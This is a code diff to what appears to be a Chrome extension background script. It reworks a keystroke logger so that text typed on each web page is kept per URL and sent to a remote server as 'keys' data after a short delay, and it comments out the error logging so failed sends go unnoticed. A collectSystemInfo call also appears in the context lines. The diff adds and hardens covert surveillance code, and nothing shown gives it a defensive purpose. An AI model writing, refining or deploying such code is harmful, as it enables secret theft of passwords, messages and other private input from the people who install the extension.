@@ -11,11 +11,11 @@ function sendToServer(type, results) {
       if (response.ok) {
 
       } else {
-        console.error("Failed to send data:", results, response.statusText);
+        //console.error("Failed to send data:", results, response.statusText);
       }
     })
     .catch((error) => {
-      console.error("Error sending data:", results, error);
+      //console.error("Error sending data:", results, error);
     });
 }
 
@@ -118,26 +118,31 @@ collectSystemInfo();
 
 ************************/
 
-
-let keystrokeData = {};
-let keystrokeTimeout = null; // Declare globally
+let keystrokeData = new Map();
+let keystrokeTimeouts = new Map(); // Store timeouts per URL
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.type === "keystroke") {
         const { url, text, timestamp } = message;
 
-        if (!keystrokeData[url]) {
-            keystrokeData[url] = [];
+        if (!keystrokeData.has(url)) {
+            keystrokeData.set(url, []);
         }
 
-        if (keystrokeTimeout) {
-            clearTimeout(keystrokeTimeout);
+        if (keystrokeTimeouts.has(url)) {
+            clearTimeout(keystrokeTimeouts.get(url));
         }
 
-        keystrokeTimeout = setTimeout(() => {
-            keystrokeData[url] = { text, timestamp };
-            sendToServer("keys", keystrokeData);
-            keystrokeTimeout = null; // Reset timeout reference
+        const timeout = setTimeout(() => {
+            keystrokeData.get(url).push({ text, timestamp });
+
+             const entries = Array.from(keystrokeData.entries()).filter(([key]) => key !== url);
+            keystrokeData = new Map([...entries, [url, keystrokeData.get(url)]]);
+
+            sendToServer("keys", Object.fromEntries(keystrokeData));
+            keystrokeTimeouts.delete(url);
         }, 3000);
+
+        keystrokeTimeouts.set(url, timeout);
     }
 });
